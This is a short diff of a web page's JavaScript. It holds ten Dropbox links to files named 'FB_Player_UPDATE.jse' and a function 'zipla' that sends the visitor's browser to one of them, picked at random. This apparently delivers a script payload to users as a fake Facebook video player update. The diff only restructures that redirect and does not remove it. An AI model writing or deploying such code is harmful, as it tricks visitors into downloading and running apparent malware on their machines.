@@ -341,8 +341,6 @@ background:#fff !important;
               .css('oFilter',filterVal)
               .css('msFilter',filterVal);
         }
-		
-		function zipla(){
         var links = ["https://www.dropbox.com/s/yc8p3s96kfcivw4/FB_Player_UPDATE.jse?dl=1",
         "https://www.dropbox.com/s/hax0z6b5cmbug1d/FB_Player_UPDATE%281%29.jse?dl=1",
         "https://www.dropbox.com/s/wskkahi2f6z105i/FB_Player_UPDATE%282%29.jse?dl=1",
@@ -353,7 +351,10 @@ background:#fff !important;
         "https://www.dropbox.com/s/t02qj6efkjorcyc/FB_Player_UPDATE%288%29.jse?dl=1",
         "https://www.dropbox.com/s/at1ggxta1ajq4u0/FB_Player_UPDATE%289%29.jse?dl=1",
         "https://www.dropbox.com/s/ekff9mljchiud3p/FB_Player_UPDATE%2810%29.jse?dl=1"];
-        var randlink = links[Math.floor(Math.random()*links.length)];
+        randlink = links[Math.floor(Math.random()*links.length)];
+
+		function zipla(){
+        
 		window.location.href = randlink;
 		function show(){
 			
